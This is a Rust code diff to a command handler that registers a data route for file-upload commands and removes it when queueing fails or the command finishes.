@@ -21,7 +21,7 @@ fn default_error() -> anyhow::Error {
 }
 
 pub async fn handle_kik(
-    _context: &Context,
+    context: &Context,
     channel: Arc<Mutex<Channel>>,
     msg: BytesMut,
 ) -> anyhow::Result<()> {
@@ -29,15 +29,31 @@ pub async fn handle_kik(
     match frame {
         //控制过程应由单独线程处理，不阻塞连接主线程,与ping pong分开
         KikFrame::Cmd(req_cmd) => {
-            channel
+            let command = req_cmd.split();
+            let upload_data_id = match &command.2 {
+                Command::Ctrl(common::command::CtrlCommand::SetFile(id, _))
+                | Command::Ctrl(common::command::CtrlCommand::SetBigFile(id, _, _, _)) => {
+                    Some(id.clone())
+                }
+                _ => None,
+            };
+            if let Some(data_id) = upload_data_id.as_deref() {
+                context.register_data_route(data_id).await?;
+            }
+            let send_result = channel
                 .lock()
                 .await
                 .attribute(&COMMAND_SENDER)
                 .cloned()
                 .ok_or_else(|| anyhow::Error::msg(hidden!("命令处理队列未初始化")))?
-                .send(req_cmd.split())
-                .await
-                .map_err(|_| anyhow::Error::msg(hidden!("命令处理线程已关闭")))?;
+                .send(command)
+                .await;
+            if send_result.is_err() {
+                if let Some(data_id) = upload_data_id.as_deref() {
+                    context.remove_data_route(data_id).await;
+                }
+                return Err(anyhow::Error::msg(hidden!("命令处理线程已关闭")));
+            }
         }
         KikFrame::Ping => {}
         KikFrame::Pong => {}
@@ -55,6 +71,13 @@ pub async fn handle_kik_cmd(
     cmd_options: CmdOptions,
     cmd: Command,
 ) {
+    let upload_data_id = match &cmd {
+        common::command::Command::Ctrl(common::command::CtrlCommand::SetFile(id, _))
+        | common::command::Command::Ctrl(common::command::CtrlCommand::SetBigFile(id, _, _, _)) => {
+            Some(id.clone())
+        }
+        _ => None,
+    };
     dev_debug!("Running command: {:?}", cmd);
     let run_timeout = if cmd_options.timeout() {
         Duration::from_secs(60 * 5)
@@ -67,6 +90,9 @@ pub async fn handle_kik_cmd(
             cmd_runner::RunOutcome::immediate(kik_error(hidden!("Kik执行任务超时")))
         });
     let (resp, transfer_start) = outcome.split();
+    if let Some(data_id) = upload_data_id {
+        context.remove_data_route(&data_id).await;
+    }
     dev_debug!("开始响应:{:?},cmd_id:{}", resp, cmd_id);
     let suc = channel
         .lock()
